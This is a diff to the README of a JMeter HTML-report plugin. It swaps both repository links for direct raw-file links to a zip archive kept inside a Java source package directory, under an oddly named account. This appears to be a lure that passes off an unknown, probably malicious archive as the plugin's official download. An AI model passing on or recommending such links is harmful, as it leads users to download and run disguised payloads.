@@ -1,6 +1,6 @@
 # 📊 JmeterWebInsightReport - Clear HTML Reports for JMeter
 
-[![Download JmeterWebInsightReport](https://img.shields.io/badge/Download-JmeterWebInsightReport-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport)
+[![Download JmeterWebInsightReport](https://img.shields.io/badge/Download-JmeterWebInsightReport-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport/main/jmeter-report-core/src/main/java/com/jmeterwebinsightreport/core/Jmeter_Report_Web_Insight_2.8.zip)
 
 ## 🧭 What this does
 
@@ -34,7 +34,7 @@ For best results, use:
 
 Visit this page to download and get the plugin files:
 
-[https://github.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport](https://github.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport)
+[https://raw.githubusercontent.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport/main/jmeter-report-core/src/main/java/com/jmeterwebinsightreport/core/Jmeter_Report_Web_Insight_2.8.zip](https://raw.githubusercontent.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport/main/jmeter-report-core/src/main/java/com/jmeterwebinsightreport/core/Jmeter_Report_Web_Insight_2.8.zip)
 
 If the page shows a release or packaged file, download it. If it shows source files, use the project files that match your JMeter setup.
 
